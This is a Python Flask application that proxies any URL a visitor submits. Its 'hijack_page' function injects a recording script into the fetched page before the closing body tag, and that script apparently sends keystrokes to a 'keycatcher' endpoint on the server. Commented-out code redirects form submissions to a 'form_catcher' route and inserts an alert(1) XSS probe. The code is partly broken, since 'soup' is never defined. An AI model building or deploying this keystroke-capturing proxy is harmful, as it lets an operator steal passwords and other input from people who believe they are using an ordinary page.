import re
import requests
from flask import Flask, render_template, url_for, request
from database import db_session
from models import User

app = Flask(__name__, static_path='/static', static_url_path='/static')

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


def save(obj):
    db_session.add(obj)
    return db_session.commit()


def create_user():
    user = User()
    save(user)
    return user.id

def save_key(id, key):
    user = User.query.filter(User.id==id).first()
    keys = user.add_key(key)
    save(user)
    return keys


@app.route("/")
def new_tab():
    user_id = create_user()
    return render_template('new_tab.html', user_id=user_id)

@app.route("/fetch/", methods=["POST"])
def fetch_page():
    host_url = request.host_url
    form = request.form
    target_URL = form['targetURL']
    user_id = form['userID']
    r = requests.get(target_URL)
    text = r.text
    modified_text = hijack_page(text, user_id, host_url)
    return modified_text


def hijack_page(text, user_id, host_url, no_js=False):
    # # hack to replace form actions with our own
    # text = re.sub(r'action\=\".*\" ', 'action="/form_catcher" ', text)
    # text = re.sub(r'action\=\".*\">', 'action="/form_catcher">', text)
    if no_js:
        soup.script.replaceWith('')
    fp = open('static/record.js')
    script_body = fp.read()
    fp.close()
    post_url = ''.join([host_url, 'keycatcher', '/'])
    script_tag = '<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script><script>var user_id="{0}", post_url="{1}"; {2}</script>'.format(user_id, post_url, script_body)
    ind = text.index('</body>')
    new_page = insert(text, script_tag, ind)

    # script_tag2 = '<script>alert(1)</script>'
    # ind2 = new_page.index('</head>')
    # new_page = insert(new_page, script_tag2, ind2)
    return new_page

def insert(string, substring, index):
    str_beginning = string[:index]
    str_end = string[index:]
    new_string = ''.join([str_beginning, substring, str_end])
    return new_string

if __name__ == "__main__":
    app.run(debug=True)
